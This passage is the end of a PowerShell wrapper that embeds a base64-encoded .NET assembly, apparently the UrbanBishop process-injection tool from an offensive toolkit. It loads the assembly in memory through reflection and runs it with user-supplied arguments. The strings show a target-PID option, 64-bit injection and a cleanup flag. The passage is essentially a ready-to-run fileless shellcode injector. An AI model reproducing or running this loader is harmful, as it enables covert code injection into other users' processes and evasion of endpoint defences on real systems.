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"
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [UrbanBishop.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
